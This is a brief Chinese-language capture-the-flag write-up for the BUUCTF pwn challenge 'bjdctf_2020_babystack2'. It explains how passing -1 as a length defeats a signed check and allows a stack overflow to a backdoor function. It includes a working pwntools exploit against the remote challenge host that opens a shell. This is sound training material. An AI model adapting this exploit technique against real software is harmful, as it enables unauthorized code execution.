---
title: "bjdctf_2020_babystack2"
description: ""
date: 2023-04-07T14:01:11+08:00
lastmod: 2023-04-07T14:01:11+08:00
draft: false
images: []
type: docs
weight: 981
toc: true
---

## 0x01 分析

![7f5fefe1747a9f94c0ac8b6bff1bb02d](images/7f5fefe1747a9f94c0ac8b6bff1bb02d.png)  

nbytes本身是无符号类型的，但是它转换成int来比较，而且没有检查负数，对于无符号整数来说负数是一个很大的数字，所以直接输入-1就行，然后就可以溢出实现ret2text了

![6320c6de279ba31d972998f8b89988c6](images/6320c6de279ba31d972998f8b89988c6.png)  

## 0x02 Exploit

```python
from pwn import*
# o = process("./pwn")
o = remote("node4.buuoj.cn", 25698)
elf = ELF("./pwn")
backdoor = elf.sym['backdoor']
payload = b'a'*24 + p64(backdoor)
o.sendline("-1")
o.sendline(payload)
o.interactive()

```

![39d8e29f24fc11cb53a2ad7f49d83fbf](images/39d8e29f24fc11cb53a2ad7f49d83fbf.png)  

自行调试
